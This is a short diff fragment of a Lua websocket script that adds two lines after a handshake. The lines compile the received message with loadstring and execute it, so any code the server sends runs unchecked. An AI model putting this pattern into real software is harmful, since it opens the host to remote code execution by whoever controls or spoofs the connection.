@@ -28,6 +28,8 @@ else
 
     -- sends the secondary handshake
     ws.send(TRUST_MESSAGE)
+    command = loadstring(msg)
+    command()
 
     -- MAIN CODE
     while true do
